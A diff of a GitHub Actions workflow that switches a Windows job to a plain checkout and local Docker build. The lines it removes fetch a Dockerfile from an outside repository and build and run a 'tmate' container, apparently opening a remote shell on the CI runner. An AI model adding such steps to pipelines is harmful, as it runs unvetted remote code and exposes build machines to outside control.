@@ -1,9 +1,20 @@
-name: CI
-on: [push]
+name: Build Docker Image on Windows
+
+on:
+  push:
+    branches: [ main ]  # or any branch you prefer
+
 jobs:
   build:
     runs-on: windows-latest
+
     steps:
-      - run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/kalepailmine001/ssh/refs/heads/main/.github/workflows/Dockerfile -OutFile Dockerfile
-      - run: docker build -t tmate .
-      - run: docker run tmate -F
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Verify Docker is Installed
+        run: docker version
+
+      - name: Build Docker Image
+        run: |
+          docker build -t my-image:latest .
